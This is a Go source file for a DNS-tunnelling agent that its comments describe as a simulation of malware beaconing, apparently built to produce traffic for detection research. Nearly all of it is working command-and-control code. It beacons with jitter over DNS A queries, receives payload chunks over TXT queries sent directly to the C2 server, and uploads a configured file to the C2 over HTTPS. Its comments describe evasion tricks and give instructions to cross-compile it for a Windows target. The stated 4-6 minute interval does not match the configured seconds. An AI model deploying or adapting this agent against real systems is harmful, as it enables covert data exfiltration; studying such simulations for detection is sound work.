// DNS Tunnel Agent - Simulates malware beacon behavior
//
// This agent demonstrates DNS-based C2 communication:
//  1. Beacons via A record queries every 4-6 minutes
//  2. Interprets response IP to determine if job exists
//  3. If job: switches to TXT queries to receive payload
//  4. After TXT complete: uploads file via HTTPS
//  5. Returns to beaconing
//
// ROUTING BEHAVIOR:
//   - A record beacons: Go through local resolver (when DirectMode=false)
//   - TXT record transfer: ALWAYS direct to C2 (bypass caching)
//
// USAGE:
//  1. Configure variables below
//  2. Cross-compile for Windows: GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent
//  3. Run on Windows target
package main

import (
	"log"
	"motd_joker_screenmate/internal/https"
	"time"

	"motd_joker_screenmate/internal/dns"
	"motd_joker_screenmate/internal/protocol"
)

// =============================================================================
// CONFIGURATION - Modify these variables for your environment
// =============================================================================

var (
	// Domain is the base domain for DNS queries.
	Domain = "timeserversync.com"

	// C2ServerIP is the IP address of the C2 server.
	// Used for:
	//   - HTTPS connection (Phase 5)
	//   - TXT queries (always direct)
	//   - A queries (when DirectMode=true)
	C2ServerIP = "127.0.0.1"

	// DirectMode controls A record query routing:
	//   true  = A queries go directly to C2 (for testing)
	//   false = A queries go through local resolver (for experiment)
	//
	// NOTE: TXT queries ALWAYS go direct to C2 regardless of this setting.
	DirectMode = true

	// DNSResolver is the local DNS resolver for A queries when DirectMode=false.
	// Examples: "192.168.1.1:53", "10.0.0.1:53", "8.8.8.8:53"
	DNSResolver = "8.8.8.8:53"

	// BeaconInterval is the base time between A record check-ins (seconds).
	BeaconInterval = 10

	// Jitter is the ± randomization applied to BeaconInterval (seconds).
	// Actual interval will be BeaconInterval ± Jitter (4-6 minutes).
	Jitter = 5

	// HTTPSPort is the port for direct HTTPS connection to C2.
	HTTPSPort = 8443

	// ExfilFilePath is the file to upload to the C2 after TXT transfer.
	// Should be ~200MB for realistic exfiltration traffic.
	ExfilFilePath = `./exfil/data.zip`

	// TXTQueryDelayMs is the delay between TXT queries (milliseconds).
	// A small delay makes the traffic look more natural.
	TXTQueryDelayMs = 1500 // 1.5 seconds
)

func main() {
	log.Println("=== DNS Tunnel Agent ===")
	log.Printf("Domain: %s", Domain)
	log.Printf("C2 Server: %s", C2ServerIP)
	log.Printf("Direct Mode (for A queries): %v", DirectMode)

	// Determine target for A queries
	var aTarget string
	if DirectMode {
		aTarget = C2ServerIP + ":53"
		log.Printf("A Query Target: %s (DIRECT TO C2)", aTarget)
	} else {
		aTarget = DNSResolver
		log.Printf("A Query Target: %s (via local resolver)", aTarget)
	}

	// TXT queries ALWAYS go direct to C2
	txtTarget := C2ServerIP + ":53"
	log.Printf("TXT Query Target: %s (ALWAYS DIRECT)", txtTarget)

	log.Printf("HTTPS Target: %s:%d", C2ServerIP, HTTPSPort)
	log.Printf("Beacon interval: %d ± %d seconds", BeaconInterval, Jitter)
	log.Printf("Exfil file: %s", ExfilFilePath)

	// Create DNS client with separate targets for A and TXT
	dnsClient := dns.NewClient(aTarget, txtTarget, Domain)

	// Create HTTPS client for file uploads
	httpsClient := https.NewClient(C2ServerIP, HTTPSPort)

	// Main beacon loop
	log.Println("[AGENT] Starting beacon loop...")
	for {
		// Perform A record check-in
		log.Println("[BEACON] Sending A record query...")
		isJob, err := dnsClient.Beacon()

		if err != nil {
			log.Printf("[BEACON] Query failed: %v", err)
			// On error, wait and retry
			sleepWithJitter()
			continue
		}

		if isJob {
			log.Println("[BEACON] JOB RECEIVED! Switching to TXT transfer mode...")

			// Perform TXT transfer (direct to C2)
			receiveTXTPayload(dnsClient)

			// Perform HTTPS upload
			log.Println("[AGENT] TXT transfer complete. Starting HTTPS exfiltration...")
			performHTTPSExfil(httpsClient)

			log.Println("[AGENT] Exfiltration complete. Resuming normal beacon cycle...")
		} else {
			log.Println("[BEACON] No job pending, sleeping...")
		}

		// Sleep with jitter before next beacon
		sleepWithJitter()
	}
}

// receiveTXTPayload queries TXT records in a loop until transfer is complete.
// Each TXT record contains a sequence number + base64 encoded chunk.
// An empty TXT record signals the end of the transfer.
//
// NOTE: TXT queries go DIRECTLY to C2 server, bypassing the local resolver.
// This avoids caching issues since we reuse the same 20 subdomains.
//
// The detection signal is the volume of TXT queries, not the routing path.
func receiveTXTPayload(client *dns.Client) {
	log.Println("[TXT] Starting payload transfer (direct to C2)...")

	chunksReceived := 0
	totalBytes := 0
	startTime := time.Now()

	for {
		// Query for next TXT record (goes direct to C2)
		txtValue, isEmpty, err := client.QueryTXT()

		if err != nil {
			log.Printf("[TXT] Query error: %v", err)
			// Continue anyway - we don't care about packet loss for this simulation
			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
			continue
		}

		// Check for end of transfer (empty TXT record)
		if isEmpty {
			elapsed := time.Since(startTime)
			log.Printf("[TXT] Transfer complete!")
			log.Printf("[TXT] Received %d chunks, ~%d bytes in %v", chunksReceived, totalBytes, elapsed)
			return
		}

		// Parse the chunk (sequence number + base64 data)
		seqNum, payload, err := protocol.ParseChunk(txtValue)
		if err != nil {
			log.Printf("[TXT] Failed to parse chunk: %v", err)
			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
			continue
		}

		chunksReceived++
		totalBytes += len(payload)

		// Log progress every 100 chunks to avoid log spam
		if chunksReceived%100 == 0 || chunksReceived <= 5 {
			log.Printf("[TXT] Received chunk %d (seq=%d, %d bytes, total=%d bytes)",
				chunksReceived, seqNum, len(payload), totalBytes)
		}

		// Small delay between queries to look more natural
		time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
	}
}

// performHTTPSExfil uploads the configured file to the C2 server.
// This simulates data exfiltration after the DNS channel "upgrades" to HTTPS.
func performHTTPSExfil(client *https.Client) {
	log.Printf("[HTTPS] Preparing to upload: %s", ExfilFilePath)

	// Check if C2 is reachable
	if err := client.CheckConnection(); err != nil {
		log.Printf("[HTTPS] C2 server not reachable: %v", err)
		log.Println("[HTTPS] Skipping exfiltration, will retry next job cycle.")
		return
	}

	// Upload the file
	if err := client.UploadFile(ExfilFilePath); err != nil {
		log.Printf("[HTTPS] Upload failed: %v", err)
		log.Println("[HTTPS] Exfiltration failed, will retry next job cycle.")
		return
	}

	log.Println("[HTTPS] Exfiltration successful!")
}

// sleepWithJitter pauses execution for BeaconInterval ± Jitter seconds.
// This randomization is critical for evading detection.
func sleepWithJitter() {
	base := time.Duration(BeaconInterval) * time.Second
	jitter := time.Duration(Jitter) * time.Second

	sleepDuration := protocol.CalculateJitter(base, jitter)

	log.Printf("[AGENT] Sleeping for %v", sleepDuration)
	time.Sleep(sleepDuration)
}
